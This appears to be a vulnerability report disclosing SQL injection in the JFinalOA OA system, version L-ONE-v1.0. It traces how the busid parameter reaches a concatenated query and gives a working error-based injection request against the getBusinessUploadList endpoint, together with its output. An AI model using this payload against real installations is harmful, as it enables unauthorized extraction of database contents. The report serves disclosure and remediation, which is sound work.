# L-ONE-v1.0 JFinalOA SQL Injection Vulnerability Report

## Introduction to Vulnerabilities

Multiple interfaces in the backend of JFinalOA (an open-source Java OA system based on the JFinal 4.6 framework) are vulnerable to SQL injection. Parameters such as `busid`, `id`, and `taskid` are directly embedded into SQL statements through string concatenation, without using parameterized queries.
The `Db.find()` / `Db.paginate()` methods of JFinal ActiveRecord accept concatenated SQL strings, and the `'"+param+"'` pattern leads to closed quotation injection. The system lacks global SQL filtering, and all parameters are concatenated directly.
After logging in, the attacker can execute error injection, UNION injection, and blind injection to extract database data.

---

## Affected Versions

L-ONE-v1.0

## Utilize conditions

- After logging in, you can use it (with ordinary user permissions)

---

## Vulnerability Reproduction

### User parameters enter the call chain of the SQL statement

```
AttachmentController.getBusinessUploadList()
  → getPara("busid")                    ← 接受用户参数
  → AttachmentService.getPage(busid)    ← 传入service层
  → "and o.business_id='"+busid+"'"    ← 拼接SQL
  → Db.paginate(sql)                    ← 执行SQL
```

Extract the current database name:

```
GET /JPointLion/admin/sys/attachment/getBusinessUploadList?pageNumber=1&pageSize=10&busid=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))%23
```

return：`XPATH syntax error: '~jfinaloa'`

![image-20260804100151780](https://github.com/fangtang7/picx-images-hosting/raw/master/JFinalOA/image-20260804100151780.4joth01zid.webp)



---

## Source Code Analysis

Lines 50-56 of AttachmentController.java, getPara("busid","") obtains the busid value from HTTP GET parameters without any filtering and directly passes it to the Service

![image-20260804100820217](https://github.com/fangtang7/picx-images-hosting/raw/master/JFinalOA/image-20260804100820217.8dxkzykgoa.webp)

Lines 25-31 of AttachmentService.java directly concatenate parameters

![image-20260804100939564](https://github.com/fangtang7/picx-images-hosting/raw/master/JFinalOA/image-20260804100939564.8vnmojmby0.webp)
